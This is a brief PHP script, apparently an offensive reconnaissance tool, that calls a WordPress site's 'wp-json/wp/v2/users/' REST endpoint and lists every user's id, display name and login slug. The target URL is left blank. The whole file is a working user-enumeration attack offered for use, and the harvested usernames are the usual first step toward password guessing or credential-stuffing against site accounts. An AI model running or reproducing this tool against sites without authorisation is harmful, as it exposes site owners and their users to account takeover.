#!usr/bin/php
<?php
header ('Content-type: text/html; charset=UTF-8');


$url= "";
$payload="wp-json/wp/v2/users/";
$urli = file_get_contents($url.$payload);
$json = json_decode($urli, true);
if($json){
	echo "*-----------------------------*\n";
foreach($json as $users){
	echo "[*] Name: |" .$users['id']   ."|\n";
	echo "[*] Name: |" .$users['name']   ."|\n";
	echo "[*] User :|" .$users['slug']   ."|\n";
	echo "\n";
}echo "*-----------------------------*";} 
else{echo "[*] No users found";}

?>

 